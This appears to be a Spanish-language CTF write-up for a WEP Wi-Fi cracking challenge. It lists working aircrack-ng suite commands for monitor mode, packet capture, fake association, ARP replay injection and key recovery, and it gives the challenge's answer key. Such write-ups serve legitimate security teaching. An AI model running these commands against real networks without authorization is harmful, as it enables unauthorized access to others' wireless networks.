### Hey buddy, where's my WiFi? - 60 Points
#### Crack the WiFi key (WEP) of "hackerctf" network and write the key in plain ascii here

##### Category: Cracking Wi-Fi 
##### Solves: 10 

Este reto era el principal para poder acceder a los otros que se hacían en local, ya que se necesitaba acceder a dicha red Wi-Fi para poder visualizar las otras máquinas existentes en la red.

Puesto que el tipo de cifrado de esta red era WEP, era trivial poder obtener la contraseña de acceso debido a las vulnerabilidades que existen en dicho protocolo. Para ello se utilizó la suite “aircrack-ng” para capturar tráfico en la red y posteriormente inyectar nuevos paquetes para agilizar el proceso y obtener distintos IVs más rápidamente.

Resumidamente, el proceso fue:

1. Establecer la tarjeta de red Wi-Fi en modo monitor:

	  <code>airmon-ng start wlan0</code> 
    
    Esto nos genera la interfaz “wlan0mon” en modo monitor.

2. Capturar tráfico de la red deseada en “trafico_capturado” para su posterior crackeo:

	  <code>airodump-ng --essid “hackerctf” -w trafico_capturado wlan0mon</code>

3. Mientras se capturaba el tráfico, en una terminal nueva nos asociamos con el punto de acceso para poder inyectar tráfico posteriormente:
	
    <code>aireplay-ng -1 0 -e hackerctf -a <MAC_del_AP> -h <MAC_de_nuestra_tarjeta> wlan0mon </code>

4. Tras realizar la asociación correctamente, procedimos a inyectar tráfico para generar nuevos IVs:

    <code>aireplay-ng -3 -b <MAC_del_AP> -h <MAC_de_nuestra_tarjeta> wlan0mon</code>

5. Paralelamente a los puntos 2 y 4, se iba probando de crackear la contraseña hasta que se consiguió un número adecuado de IVs y se obtuvo la contraseña utilizada **“AHMED”**:
	  
    <code>aircrack-ng -z -b <MAC_del_AP>  trafico_capturado.cap</code>
